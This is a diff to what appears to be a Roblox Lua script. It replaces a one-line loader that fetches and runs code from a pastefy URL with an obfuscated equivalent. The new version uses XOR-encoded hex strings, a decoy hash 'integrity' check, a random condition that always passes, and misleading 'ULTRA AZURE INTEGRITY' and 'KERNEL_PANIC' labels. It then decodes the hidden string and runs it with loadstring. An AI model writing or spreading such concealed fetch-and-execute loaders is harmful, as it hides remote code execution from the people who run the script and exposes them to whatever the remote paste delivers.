@@ -1,1 +1,50 @@
-loadstring(game:HttpGet("https://pastefy.app/yE8DCvlx/raw"))()
+-- ╔══╦═╦═╦═╦══╗
+-- ║══╣╦╣║║║╠║║╝
+-- ╠══║╩╣║║║╠║║╗
+-- ╚══╩═╩╩═╩╩══╝
+-- ╔╗─╔╦═╗╔══╗
+-- ║╚╦╝╠╗║║╔╗║
+-- ╚╗║╔╬╝╚╣╚╝║
+-- ─╚═╝╚══╩══╝
+-- -- [[ SEMI-V2.5 ULTRA AZURE INTEGRITY ]]
+-- Encryption: Hardened Line-by-Line
+local _0x6c390 = {
+    "0a08090d191f1e040800400e0b0609572e131c192d0e1845440f1c1d1a1856424917091a1e0e0a14480618194512295522241e0512441e0c114541404242"
+}
+local _0xe8a30 = 102
+local _0x16a5e = 8
+local _0x0f707 = "34712992"
+
+local _0x40831 = function(s)
+    local h = 0
+    for i = 1, #s do
+        h = (31 * h + s:byte(i)) % 4294967296
+    end
+    return string.format("%x", math.abs(h))
+end
+
+local _0x67f81 = function(ls, k, s)
+    local raw = table.concat(ls)
+    if _0x40831(raw) ~= _0x0f707 then 
+        return "warn('[SEMI-V2.5] INTEGRITY_FAULT_DETECTED')" 
+    end
+    local full = ""
+    for li, lv in ipairs(ls) do
+        local line_res = ""
+        local _l_idx = li - 1
+        for i = 1, #lv, 2 do
+            local b = tonumber(lv:sub(i, i+1), 16)
+            local dk = (k + ((_l_idx + (i//2)) % s)) % 256
+            line_res = line_res .. string.char(bit32.bxor(b, dk))
+        end
+        full = full .. line_res .. "\n"
+    end
+    return full
+end
+
+local _0x_p = (function(a,b) return (a*b) < (a+b)*100 end)(math.random(1,5), math.random(1,5))
+if _0x_p then
+    local _0x479d7 = _0x67f81(_0x6c390, _0xe8a30, _0x16a5e)
+    local _s, _e = pcall(function() return loadstring(_0x479d7)() end)
+    if not _s then warn("[SEMI-V2.5] KERNEL_PANIC: " .. tostring(_e)) end
+end
